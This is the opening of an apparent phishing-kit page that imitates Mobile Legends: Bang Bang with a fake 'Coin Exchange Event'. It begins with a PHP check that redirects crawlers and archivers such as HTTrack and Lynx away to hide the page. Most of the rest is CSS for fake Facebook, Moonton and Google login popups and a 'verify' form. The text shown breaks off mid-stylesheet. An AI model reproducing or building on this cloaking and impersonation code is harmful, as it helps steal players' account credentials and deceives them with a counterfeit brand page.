<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Mobile Legends: Bang Bang</title>
<meta property="og:description" content="Mobile Legends: Coin Exchange Event - THE ASPIRANT">
<meta property="og:image" content="https://m.mobilelegends.com/static/images/favicon.ico">
<meta property="og:image:width" content="540">
<meta property="og:image:height" content="282">
<link rel="icon" type="img/png" href="https://m.mobilelegends.com/static/images/favicon.ico" sizes="32x32">
<link href="https://fonts.googleapis.com/css2?family=Teko&display=swap" rel="stylesheet">
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/style2.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/loader.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/moonton.css">
<link rel="stylesheet" href="css/google.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<style type="text/css">
@charset "utf-8";
@import url("https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Teko:300,400,500");
*,*:before,*:after {
	-webkit-box-sizing:border-box;
	-moz-box-sizing:border-box;
	box-sizing:border-box;
}
@font-face {
    font-family: 'laza'; 
    font-style: normal;
    font-weight: 700;
    src: url(fonts/laza.woff2) format("woff2"), 
        url(fonts/laza.woff) format("woff"),
        url(fonts/laza.ttf) format("truetype");
}
body {
	background: #000000 center / cover no-repeat;
	margin: 0;
	background-size: cover;
	font-family: 'Teko', 'laza';
	width: 100px;
	min-width: 390px;
	max-width: 450px;
	margin-left: auto;
	margin-right: auto;
	

}

.container {
	background: url(#000) no-repeat center center;
	background-size: cover;
	position: relative;
	margin: 0px auto;
	max-width: 400px;
	height: auto;
}
.lazapop3{background:url(../img/rewards/suit/laza3.jpg) no-repeat center center;background-size:100% 100%;width:395px;height:250px;position:relative;margin-top:310px;margin-bottom:auto;margin-left: auto;margin-right: auto;display: block;

  

}
.laz-container {	
   background: url('img/bgreward.jpg') no-repeat center;
   background-size: 100% 100%;
   margin-top: 0px;   
   padding: 0px;
   width:100%;
   height: 697px;
   border:none;  
}
.laz-container-top {	
	margin-top: -1px;   
    padding: 0px;
    width:100%;
    height: auto;
    border:none;  
}
.sec-verify-container {	
   background: url('img/bgreward.jpg') no-repeat center;background-size: cover;	
   background-size:100% 100%;
   margin-top: 0px;   
   padding: 0px;
   width:100%;
   height: 550px;
   border:none;  
}
.navbar {
	background: #0C0C0C;
	width: 100%;
	height: 65px;
}
.navbar-logo {
    width: 117px;
    float: left;
    margin-top: 10px;
    margin-left: 11px;
}
.navbar-shop {
	width: 25px;
	margin-top: 19px;
	margin-right: 20px;
}
.navbar-language {
	width: 25px;
	margin-top: 19px;
	margin-right: 20px;
}
.navbar-menu {
	width: 20px;
	margin-top: 19px;
	margin-right: 5px;
}
.navbar-right {
	width: auto;
	float: right;
}
.navbar-download {
	background: #ffca13;
	width: 46px;
	height: 45px;
	margin-top: 10px;
	margin-right: 10px;
	border-radius: 7px;
	float: right;
}
.navbar-download img {
	width: 20px;
	height: 21px;
	margin: 13px;
}
.header {
	width: 100%;
	height: auto;
	margin-bottom:0px;		
}
.header img {
	width: 100%;
	height: auto;
	margin-bottom:0px;		
	border:none;
	margin-top: 2px;
}
.lazahome {
  background: url ('img/bgrerd.jpg') no-repeat center center;
	background-size:100% 100%;
	width: 100%;
	height: auto;	
}
.lazahome img {
	width: 100%;
	height: 550px;		
}
.popreward{

	background:url(img/lazapop.png) no-repeat center center;
	background-size:100% 100%;
	width: 100%;
	height: 230px;
}
.popreward1{

	background:url(img/pop1.jpg) no-repeat center center;
	background-size:100% 100%;
	width: 100%;
	height: 230px;
}
.popreward2{

	background:url(img/pop2.jpg) no-repeat center center;
	background-size:100% 100%;
	width: 100%;
	height: 230px;
}
.popreward3{

	background:url(img/pop3.jpg) no-repeat center center;
	background-size:100% 100%;
	width: 100%;
	height: 230px;
}
.lazaload {
	width: 100%;
	height: auto;	
}
.lazaload img {
	width: 100%;
	height: auto;		
}
.button1{
  background: url ('img/rewards/suit/1.jpg') no-repeat center center;
	background-size:100% 100%;
	width: 42px;
	position:absolute;
	top:200px;
	left:246px;
	height: auto;	
}
.button2{
  background: url ('img/rewards/suit/1.jpg') no-repeat center center;
	background-size:100% 100%;
	width: 42px;
	position:absolute;
	top:200px;
	left:300px;
	height: auto;	
}
.lazahomex {
   background: url('img/bgreard.jpg') no-repeat center;background-size: cover;	
   margin-top: 0px;   
   padding: 0px;
   width:100%;
   height: 740px;
   border:none;  
}
.lazahomex video {
	width: 100%;
	height: auto;	
}
.lazaload2 {
	width: 100%;
	height: auto;	
}
.lazaload2 video {
	width: 100%;
	height: auto;	
}
.lazaload3 {
	width: 100%;
	height: auto;	
}
.lazaload3 video {
	width: 100%;
	height: auto;	
}
.header video {
	width: 100%;
	height: auto;	
}
.headerfoot {
	width: 95%;
	height: auto;		
	margin-top: -20px;
	margin-left: auto;	
	margin-right: auto;	
}
.headerfoot img {
	width: 100%;
	height: auto;
	margin-top: -0px;	
	border-radius: 5px;
	border:1px solid #B22AE8;
}
.event-title {
	background:url(img/title-sec.png) no-repeat center center;
	background-size:100% 100%;
	width:92%;
	height: 70px;
	margin-top: 2px;
	margin-bottom:1px;
	margin-right: auto;
	margin-left: auto;	
	display:block;
}
.event-notification {
    background: url(img/alert-laza.png) no-repeat center;
	background-size: 100% 100%;
	width:98%;
	height:55px;
	padding:7px;
	margin-top:3px;
	margin-bottom:7px;
	margin-right: auto;
	margin-left: auto;
}
.event-notification-text {
	padding-top:10px;
	text-align:center;
	font-family:laza;
	color:#2AAFF4;
	font-size:17px;
}
.alert-kinnon {
  background:url(img/notify.png) no-repeat center;
  background-size:100% 100%;
  width:98%;
  height:100px;
  padding:5px;
  margin-left: auto;
  margin-right: auto; 
  color:#000;  
  border:none;
}
.alert-kinnon-time {
  width:21%;
  height:20px;
  color:#AAAAAA;
  text-align:center;  
  margin-top: 22px;
  margin-right: 30px;  
  border:1px solid #AAAAAA;
  border-radius:0px;
  float: right;
  font-size: 14px;
  font-family:laza;
  text-shadow: 2px 2px 5px #000;  
}
.alert-kinnon-title {
  margin-top: 17px;  
  padding:7px;
  color:#AAAAAA;
  text-align: center;
  font-size:15px;
  font-family:laza;
  border:none;  
}
.alert-kinnon-text {
  margin-top: -5px;
  margin-left: 22px;
  padding:7px;
  color:#AAAAAA;
  text-align:left;
  font-size:13px;
  font-family:laza;
  border:none;
}
.alert-wrapper {
  width:98%;
  height:auto;
  border: none;
  display:block;
  margin:10px auto;  
  margin-top: -20px;  
}
.alert {
  background:url(img/notify-sec.png) no-repeat center;
  background-size:100% 100%;
  width:98%;
  height:50px;
  margin-top: 25px;
  margin-bottom: -1px;
  padding:7px;
  margin-left: auto;
  margin-right: auto; 
  color:#fff;  
  border:none;
}
.alert-text {
  margin-top: 1px;
  margin-left: 5px;
  padding:7px;
  color:#000;
  text-align:left;
  font-size:16px;
  font-family:laza;
  border:none;
}
.alert-text-mid {
  margin-top: 1px;  
  padding:7px;
  color:#000;
  text-align:center;
  font:25px;
  font-family:laza;
  border:none;
}
.alert-time {
  width:20%;
  height:auto;
  color:#000;
  text-align:center;  
  margin-top: 6px;
  margin-right: 10px; 
  padding:2px;
  border:2px solid #000;
  border-radius:0px;
  float: right;
  font-size: 13px;
  font-family:laza;
}
.box {
    background: url(img/kinnonbox-sec.png) no-repeat center;
	background-size: 105% 100%;
    width: 100%;
    height: 326px;
    margin-left:auto;
    margin-right:auto;      
    margin-top: 170px; 
	margin-bottom: 10px;
	border: 0px solid #E29E53;
	border-radius:5px;
	position: relative;
	display: block;
}
.box-item {
    width: 100%;
	height:auto;				
	padding-top:27px;	
	margin-left:-2px;
    margin-right:auto;   	
}
.scroll {
	overflow:scroll;
	position:relative;
	width: 100%;
	height:auto;
	padding-top:20px;
	margin-left: auto;
	margin-right: auto;
	display: block;
	scrollbar-face-color:#ffbb40;
	scrollbar-shadow-color:#ffbb40;
	scrollbar-highlight-color:#ffbb40;
	scrollbar-3dlight-color:#ffbb40;
	scrollbar-darkshadow-color:#ffbb40;
	scrollbar-track-color:#ffbb40;
	scrollbar-arrow-color:#ffbb40;
}
.verify-box-navbar {	
	background-size: 100% 100%;
	width: 93%;
	height: 19%;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.verify-box-navbar-description {
	width: 50%;
	margin-top: 50px;
	margin-right: 20px;
	color: #fff;
	font-size: 18px;
	font-family: Teko;
	font-weight: 500;
	text-align: left;
	float: right;
}
.verify-box-navbar-form {	
	background-size: 100% 100%;
	width: 93%;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.verify-box-navbar-form input {
	background:url(img/verify-bg.jpg) no-repeat center center;
	background-size: 100% 100%;
	width: 95%;
	height: 40px;
	margin-left: 10px;
	margin-bottom: 4px;
	padding: 4px;
	padding-left: 10px;
	padding-right: auto;
	color: #fff;
	font-size:15px;
	font-family: laza;
	font-weight: 500;
	border: 1px solid #fff;
	position: relative;
	outline: none;
	-webkit-appearance: none;
    -moz-appearance: none;
}
.verify-box-navbar-form input::placeholder {
	color: #fff;
}
.verify-box-navbar-form select {
	background:url(img/verify-bg.jpg) no-repeat center center;
	background-size: 100% 100%;
	width: 95%;
	height: 40px;
	margin-left: 10px;
	margin-bottom: 4px;
	padding: 4px;
	padding-left: 10px;
	padding-right: auto;
	color: #fff;
	font-size:15px;
	font-family: laza;
	font-weight: 500;
	border: 1px solid #fff;
	position: relative;
	outline: none;
	-webkit-appearance: none;
    -moz-appearance: none;
}
.verify-box-content {	
	background-size: 100% 100%;
	width: 93%;
	height: auto;
	margin-top: -1px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 15px;
	padding: 20px;
	padding-top: 0px;
	padding-bottom: 25px;
	display: block;
}
.verify-box-content-title {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 6px;
	color: #fff;
	font-size: 18px;
    font-family:laza;
	font-weight: 500;
	text-align: center;
	display: block;
}
.verify-box-content-title i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #fff;
	font-size: 100px;
	text-align: center;
}
.verify-box-content button {
	background:url(img/yes_laza.png) no-repeat center center;
	background-size:100% 100%;
	width: 40%;
	height: 50px;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 7px;
	padding-top: 8px;
	padding-left: 21px;
	padding-right: 20px;
	color: #fff;
	font-size: 18px;
	font-family:laza;
	font-weight: 500;
	text-align: center;
	border: none;	
	display: block;
}
.about-box-content {	
	background:url(img/aboutrules-sec.png) no-repeat center center;
	background-size:100% 100%;
	width: 98%;
	height: 120px;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 20px;
	padding-top: 0px;
	padding-bottom: 25px;
	color: #000;
	display: block;
}
.about-box-content-title {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 6px;
	color: #000;
	font-size: 18px;
    font-family:laza;
	font-weight: 500;
	text-align: center;
	display: block;
}
.about-box-content-title i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #000;
	font-size: 100px;
	text-align: center;
}
.about-box-content button {
	background:url(img/menu-on.png) no-repeat center center;
	background-size:100% 100%;
	width: 50%;
	height: 45px;	
	padding: 7px;
	margin-bottom: 20px;	
	margin-top: 20px;
	padding-left: 20px;
	padding-right: 20px;
	color: #000;
	font-size: 18px;
	font-family:laza;
	font-weight: 500;
	text-align: center;
	border: none;	
	display: block;
}
.btn-wrapper {
	width: 100%;
	height: 50px;	
	margin-top: 3px;				
	font-family:laza;	
}
.btn-wrapper button {
    background: url(img/button.png) no-repeat center;
	background-size: 100% 100%;
	width: 40%;
	height: 43px;
	margin-top: 45px;
	margin-left: -10px;	
	margin-right: 6px;	
	padding: 5px;	
	color: #AAAAAA;
	font-family:laza;
	font-size: 16px;	
	font-weight: 400;
	text-align: center;	
	border: none;
	outline: none;
	float:left;
	display: inline-block;	
}
.processing-box-sec {	
	background: url(img/kinnonbox-sec.png) no-repeat center;
	background-size: 100% 100%;	
	width: 98%;
	height: 350px;
	margin-left: auto;
	margin-right: auto;
	margin-top: 158px;
	margin-bottom: 15px;
	padding: 20px;
	padding-top: 10px;	
	padding-bottom: 2px;
	display: block;
}
.processing-box-sec-title {
	width: 95%;
	height: auto;
	margin-top: 5px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 20px;
	padding: 5px;
	padding-left: 10px;
	color: #fff;
	font-size: 15px;
    font-family:laza;	
	text-align: left;
	display: block;
}
.menu-wrapper-border {
	height: 11px;
}
.menu-wrapper {
	width: 94.3%;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 12px;
	display: block;
}
.menu-content {
	background:url(img/btn-off.png) no-repeat center center;
	background-size:100% 100%;
	width: 32%;
	height: auto;
	padding: 6px;
	color: #003a75;
	font-size: 17px;
	font-family:'Teko', sans-serif;
	font-weight: 500;
	text-align: center;
	text-shadow: 0 0 1px #fff38a,0 0 1px #fff38a;
	border: none;
	cursor: pointer;
	-webkit-text-stroke:0 transparent;
}
.menu-content-active {
	background:url(img/btn-on.png) no-repeat center center;
	background-size:100% 100%;
	color: #7f2c10;
}
.item4 {
	background-size:display;
	width: 42%;
    height: 77px;
	margin: 5px;
	margin-top: 1px;	
	margin-bottom: 1px;
	display: inline-block;
	border: 2px solid #000;
	border-radius: 0px;	
}
.item4 img {
	background-size:display;
	width: 100%;
    height: 100%; 
    border:none;       
    border-radius: 0px;
}
.item3 {
	background-size:display;
    width: 28%;
    height: 100px;
	margin: 5px;
	margin-top: 2px;	
	margin-bottom: 5px;
	display: inline-block;
	border: 2px solid #000;
	border-radius: 0px;	
}
.item3 img {
	background-size:display;
	width: 100%;
    height: 100%; 
    border:none;   
    border-radius: 0px;
}
.itembutton {
	background-size:display;
    width: 29%;
    height: 100px;
	margin: 7px;
	margin-top: 1px;	
	margin-bottom: 1px;
	display: inline-block;
	animation: bounce .9s infinite alternate;
    animation-play-state: running;
}
@keyframes bounce {
  to { transform: scale(1.1); }
}
.itembutton img {
	background-size:display;
	width: 100%;
    height: 100%; 
}
.item5 {
	background-size:display;
    width: 22%;
    height: 77px;
	margin: 5px;
	margin-top: 1px;	
	margin-bottom: 1px;
	display: inline-block;
	border: 2px solid #000;
	border-radius: 0px;	
}
.item5 img {
	background-size:display;
	width: 100%;
    height: 100%; 
    border:none;   
    border-radius: 0px;
}
.item2 {
	background-size:display;
    width: 22%;
    height: 77px;
	margin: 2px;	
	margin-top: 1px;
	margin-bottom: -5px;
	display: inline-block;
	border: 2px solid #000;
	border-radius: 0px;	
}
.item2 img {
	background-size:display;
	width: 100%;
    height: 100%; 
    border:none;   
    border-radius: 0px;
}
.footer {
    background: -webkit-linear-gradient(top, rgb(255 255 255 / 9%) 0%, rgb(0 0 0 / 11%) 100%);
    width: 100%;
    height: auto;
    padding: 15px;
    padding-top: 0px;
    padding-bottom: 25px;
    border-top: 1px solid #fa9115;
	color: hsla(0, 0%, 100%, .6);
    font-size: var(--small-font-size);
    background: var(--bg-linear-color);
    min-height: 12.5rem;
    margin-top: -3.125rem;
}
.footer-copyright-icon {
	width: 48%;
	padding-top: 27px;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.footer-copyright-text {	
	padding:5px;
	padding-top: 25px;
	margin-left: auto;
	margin-right: auto;	
	float: center;
	text-align: center;
	display: block;
}
.footer-copyright-text-left {
	color: #fff;
	font-size: 12px;
	padding:5px;
	font-family:sans-serif;
	text-align: center;
	display: inline-block;
	margin: 5px;
}
.footer-copyright-text-center {
	color: #fff;
	font-size: 12px;
	padding:5px;
	font-family:sans-serif;
	text-align: center;
	display: inline-block;
	margin: -3px;
}
.footer-copyright-text-right {
	color: #fff;
	font-size: 12px;
	padding:5px;
	font-family:sans-serif;
	text-align: center;
	display: inline-block;
	margin: -3px;
}
.footer-copyright-text-cookie {
	color: #fff;
	font-size: 14px;
	font-family:Teko;
	text-align: center;
	display: block;
	margin-top: -3px;
}
.footer-copyright-text-icon {	
	width:15%;
	padding:5px;
	padding-top: 25px;
	margin-left: auto;
	margin-right: auto;	
	float: center;
	text-align: center;
	display: inline-block;
}
.footer-txt-copyrights {
	color: #bdbdbd;
	padding:10px;
	padding-top:10px;
	padding-bottom:4px;
	font-size: 14px;
	font-family:arial;
	text-align: center;
}
.loadkin {
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;	
	z-index:9999;
	background:#000;
}
.loadkin-box {
	position: relative;
	margin: 50px auto;
	text-align: center;
	height: 43px;
	font-size: 20px;
	padding: 5px;
	padding-bottom: 5px;
	margin-top: 70%;  
}
.loadkin-box img {
	width:70px;
	height:85px;
	margin-bottom:10px;
}
.loadkin-box i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #fff;
	font-size: 20px;
	float:center;
	font-family: arial, sans-serif;
	text-align: center;
}
.popup {
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
	background-color: rgb(0 0 0 / 74%);
}
.popup-box-wrapper {
	width: 355px;
	height: auto;
	position: relative;
	margin: 50px auto;
	margin-top: 15%;
	text-align: center;
	font-family:'laza';
	color:#fff;
}
.popup-box-wrapper-login {
	width: 390px;
	height: auto;
	position: relative;
	margin: 50px auto;
	margin-top: 15%;
	text-align: center;
	font-family:'laza';
	color:#fff;
}
.popup-box-navbar {
	background:url(img/popup-navbar2.png) no-repeat center center;
	background-size:100% 100%;
	height: 43px;
	padding-bottom: 5px;
}
.popup-box-navbar img {
	width: 25px;
	height: 25px;
	margin-top: 7px;
	margin-right: 15px;
	float: right;
}
.popup-box-navbar-title {	
    padding-top: 9px;
    padding-left: 0px;
    padding-bottom: 2px;
    font-size: 20px;
    font-family: laza;
    font-weight: 300;
    text-align: center;
    color: #e5e5e5;
}
.popup-box-navbarz {
	background:url(img/popup-navbar2.png) no-repeat center center;
	background-size:100% 100%;
	height: 43px;
	padding-bottom: 5px;
}
.popup-box-navbarz img {
	width: 25px;
	height: 25px;
	margin-top: 7px;
	margin-right: 15px;
	float: right;
}
.popup-box-navbarz-title {	
	padding-top: 9px;
	padding-bottom: 2px;
	font-size: 20px;
	font-family:laza;
	font-weight: 300;
	text-align: center;
	color: #fff;
}
.popup-account-login {
	background:url(img/lazlogin.png) no-repeat center center;
	background-size:100% 100%;
	width: 100%;
	height: 213px;
	margin-top: -12px;
}
.popup-box-alert {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #AAAAAA;
	font-size: 17px;
    font-family:laza;
	font-weight: 500;
	text-align: left;
	display: block;
}
.popup-box-alert2 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #AAAAAA;
	font-size: 17px;
    font-family:laza;
	font-weight: 500;
	text-align: left;
	display: block;
}
.popup-box-alert0 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #AAAAAA;
	font-size: 17px;
    font-family:laza;
	font-weight: 500;
	text-align: right;
	display: block;
}
.popup-box-alert3 {
  width: 95%;
  height: auto;
  margin-top: 10px;
  margin-left: auto;
  margin-right: auto;
  margin-bottom: 10px;
  padding: 5px;
  color: #c7c7c7;
  font-size: 16px;
  font-family: laza;
  font-weight: 500;
  text-align: center;
  font-style: italic;
  display: block;
}
.popup-box-alert7 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #AAAAAA;
	font-size: 17px;
    font-family:laza;
	font-weight: 500;
	text-align: center;
	display: block;
}
.popup-box-alert4 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 6px;
	color: #AAAAAA;
	font-size: 17px;
    font-family:laza;
	font-weight: 500;
	text-align: center;
	display: block;
}
.popup-box-alert4 i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #AAAAAA;
	font-size: 50px;
	text-align: center;
}
.popup-box-alert-login {
    width: 95%;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 15px;
    padding: 6px;
    color: #AAAAAA;
    font-size: 14px;
    font-family: arial;
    font-weight: 200;
    text-align: center;
    display: block;
}
.popup-box-alert-login i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #AAAAAA;
	font-size: 50px;
	text-align: center;
}
.line {
    width: 206%;
    height: auto;
    margin-left: 97px;
    margin-top: -96px;
    padding-top: 25px;
    padding-bottom: 20px;
    border-bottom: 1px solid #ffffff59;
    display: block;
}
.popup-box-item {
	width: 16%;
    height: 67px;
    margin-top: 38px;
	margin-left: auto;
	margin-right: auto;
	text-align: right;
	display: block;
}

.popup-box-item img {
	width: 100%;
	height: 100%;
}

.popup-box-item span {
	background-size: 56% 100%;
	width: auto;
	color: #fff;
	font-size: 13px;
	font-family: laza;
	text-align: right;
	position: absolute;
	top: 57px;
    right: 4px;
}

.popup-box-item rw {
	background-size: 56% 100%;
    width: 229%;
    color: #ffffff;
    font-size: 14px;
    font-family: laza;
    float: right;
    text-align: left;
    position: absolute;
    top: 19px;
    right: -201px;
}


.popup-box-item pr {
	background-size: 56% 100%;
    width: 229%;
    color: #ffffff;
    font-size: 16px;
    font-family: laza;
    float: right;
    text-align: left;
    position: absolute;
    top: 43px;
    right: -264px;
}

.popup-box-alert-price {
    background-size: 56% 100%;
    width: auto;
    color: #cdcdcd;
    font-size: 16px;
    font-family: laza;
    float: right;
    position: absolute;
    top: 43px;
    right: -54px;
}
.rewardpop {
	background: url(img/lazlogin.png) no-repeat center center;
    background-size: 100% 100%;
    width: 361px;
    height: 240px;
    margin: 50px auto;
    text-align: center;
    margin-top: 300px;

}
.popup-box-gamecon {
	width: 52%;
	height: 65px;
	margin-left: auto;
	margin-right: auto;
	margin-top: 20px;
	display: block;
}
.popup-box-form {
	width: 85%;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	display: block;
}

.popup-box-form label {
	display: inline-block;
	width: 140px;
	text-align: right;
	color: yellow;
}

.popup-box-form input {
	background: #1a1b1c;
	background-size: 100% 100%;
	width: 100%;
	height: 35px;
	margin-bottom: 3px;
	padding: 4px;
	padding-left: 10px;
	color: #c3c3c3;
	font-size: 16px;
	font-family: laza;
	font-weight: 300;
	border: 1px solid #8f8f8f;
	position: relative;
	outline: none;
	-webkit-appearance: none;
	-moz-appearance: none;
}

.popup-box-form input::placeholder {
	color: #FFFBF7;
}

.popup-box-form select {
	background: #1a1b1c;
	background-size: 100% 100%;
	width: 100%;
	height: 35px;
	margin-bottom: 3px;
	padding: 4px;
	padding-left: 10px;
	color: #ffffff;
	font-size: 16px;
	font-family: laza;
	font-weight: 300;
	border: 1px solid #8f8f8f;
	position: relative;
	outline: none;
	-webkit-appearance: none;
	-moz-appearance: none;
}

.popup-box-footer {
	background-size: 100% 100%;
	margin-top: 20px;
	width: 100%;
	height: 45px;
}

.popup-box-footer-ignis {
	background-size: 100% 100%;
	margin-top: 35px;
	width: 100%;
	height: 61px;
}

.popup-box-footer-ignis button:nth-child(1) {
    background: url(img/btn-off.png) no-repeat center;
    background-size: 100% 100%;
    width: auto;
    height: auto;
    margin-top: -23px;
    padding: 0px;
    padding-left: 35px;
    padding-right: 35px;
    color: #120f0f;
    font-size: 18px;
    font-family: laza;
    font-weight: 500;
    margin-left: 0px;
    margin-right: auto;
    text-align: center;
    border: none;
    outline: none;
}

.popup-box-footer-ignis button:nth-child(2) {
    background: url(img/btn-on.png) no-repeat center;
    background-size: 100% 100%;
    width: auto;
    height: auto;
    margin-top: -23px;
    padding: 0px;
    padding-left: 35px;
    padding-right: 35px;
    color: #120f0f;
    font-size: 18px;
    font-family: laza;
    font-weight: 500;
    margin-left: auto;
    margin-right: auto;
    text-align: center;
    border: none;
    outline: none;
}

.popup-box-footer button {
	background: url(img/button2.png) no-repeat center;
	background-size: 100% 100%;
	width: auto;
	height: auto;
	margin-top: -23px;
	padding: 5px;
	padding-left: 35px;
	padding-right: 35px;
	color: #000;
	font-size: 18px;
	font-family: laza;
	font-weight: 500;
	margin-left: auto;
	margin-right: auto;
	text-align: center;
	border: none;
	outline: none;
}
.popup-box-form-footer {
	background-size: 100% 100%;
	width: 100%;
	height: 45px;
	margin-top: 20px;
}

.popup-box-form-footer button {
	background: url(img/button2.png) no-repeat center;
	background-size: 100% 100%;
	width: auto;
	height: auto;
	margin-top: 5px;
	padding: 4px;
	padding-left: 30px;
	padding-right: 30px;
	color: #000;
	font-size: 18px;
	font-family: laza;
	font-weight: 500;
	text-align: center;
	border: none;
	outline: none;
}

.popup-box-navbar-login {
	background: url(img/popup-navbar1.png) center center/100% 100% no-repeat;
	height: auto;
	padding-top: 5px;
	padding-bottom: 1px
}

.popup-box-navbar-login-title {
	padding-left: 24px;
	padding-top: 2px;
	color: #defbff;
	font-size: 22px;
	font-family: laza;
	font-weight: 500;
	text-align: center
}

.popup-box-bg-login {
	background: url(img/popup-box-bg-login.png) center center/100% 100% no-repeat;
	width: 100%;
	height: 255px;
	margin-top: -10px
}

.popup-box-bg-login-load {
	background: url(img/lazlogin.png) no-repeat center center;
	background-size: 100% 100%;
	margin-left: -20px;
	width: 400px;
	height: 200px;
	margin-top: -10px;
}

.load-login-img {
	width: 30%;
	height: auto;
	margin-top: 30px;
	margin-bottom: 5px
}

.load-login-gif {
	width: 15%;
	height: auto;
	margin-bottom: 0
}

.popup-btn-login {
	width: 57%;
    height: 32px;
    padding-top: 4px;
    /* padding: 0px; */
    padding-left: 8px;
    margin-bottom: 10px;
    margin: 5px;
    color: #000;
    font-size: 16px;
    font-family: laza;
    border: none;
    border-top-left-radius: 3px;
    border-top-right-radius: 3px;
    border-bottom-right-radius: 3px;
    border-bottom-left-radius: 3px;
    outline: none;
    margin-bottom: 45px;
    position: relative;
}

.popup-btn-login i {
	color: #fff;
	font-size: 14px;
	padding: 1px;
	float: left;
}

.popup-btn-facebook {
	background: url(img/btnlg.png);
    background-size: 100% 100%;
    color: #fff;
    margin-bottom: 2px;
}

.popup-btn-moonton {
	background: url(img/btnlg.png);
    background-size: 100% 100%;
    color: #fff;
    margin-bottom: 2px;
}

.popup-btn-google {
	background: url(img/btnlg.png);
    background-size: 100% 100%;
    color: #fff;
    margin-bottom: 2px;
}
.popup-btn-login img {
	width: 20px;
    margin-top: 1px;
    float: left;
}

.popup-btn-login-link {
	background: #E3B448;
	color: #000;
}

.popup-btn-login-link img {
	width: 22px;
	height: 22px;
	margin-top: -2px;
	color: #fff;
	font-size: 20px;
	float: left;
}

.popup-login {
	background: rgba(0, 0, 0, 0.4);
	width: 100%;
	height: 100%;
	position: fixed;
	top: 0;
	left: 0;
	z-index: 9999;
}

.popup-box-login-fb {
	background: #ECEFF6;
	max-width: 330px;
	height: auto;
	position: relative;
	margin: 50px auto;
	margin-top: 1.9%;
	text-align: center;
	font-family: 'Teko';
	color: #000;
	border-radius: 10px;
}

.popup-box-login-moonton {
	background: -webkit-linear-gradient(top, rgb(20 31 47) 0%, rgb(79 119 163) 100%);
    max-width: 330px;
    height: auto;
    position: relative;
    margin: 50px auto;
    margin-top: 10%;
    text-align: center;
    font-family: 'Teko';
    color: #000;
    border-radius: 1px;
}

.popup-box-login-google {
	background:#fff;
	max-width:330px;
	height:auto;
	position:relative;
	margin:50px auto;
	margin-top:36%;
	text-align:center;
	font-family: 'Open Sans', sans-serif;
	color:#000;
	border-radius:5px;
}

.popup-box-login-google {
	background:#fff;
	max-width:330px;
	height:auto;
	position:relative;
	margin:50px auto;
	margin-top:18%;
	text-align:center;
	font-family: 'Open Sans', sans-serif;
	color:#000;
	border-radius:5px;
}

.close-fb {
	background: #3b5998;
	width: 25px;
	height: 25px;
	color: #fff;
	font-size: 20px;
	text-align: center;
	text-decoration: none;
	border-radius: 50%;
	top: -10px;
	right: -10px;
	position: absolute;
	display: block;
}

.close-fb i {
	padding-top: 3px;
}

.close-other {
	background: #fff;
	width: 25px;
	height: 25px;
	color: #000;
	font-size: 20px;
	text-align: center;
	border-radius: 50%;
	top: -12px;
	right: -12px;
	position: absolute;
	z-index: 9999999;
	display: block;
}

.close-other i {
	color: #20px;
	padding-top: 3px;
}

.popups {
	width: 100%;
	height: 100%;
	position: fixed;
	top: 0;
	left: 0;
	z-index: 9999;
	background-color: rgba(0, 0, 0, 0.4);
}

.popup-box-wrappers {
	width: 390px;
	height: auto;
	position: relative;
	margin: 50px auto;
	margin-top: 15%;
	text-align: left;
	font-family: 'laza';
	color: #fff;
}
.popup-box-navbar-ignis {
	background: url(img/popup-navbar-ignis.png) no-repeat center center;
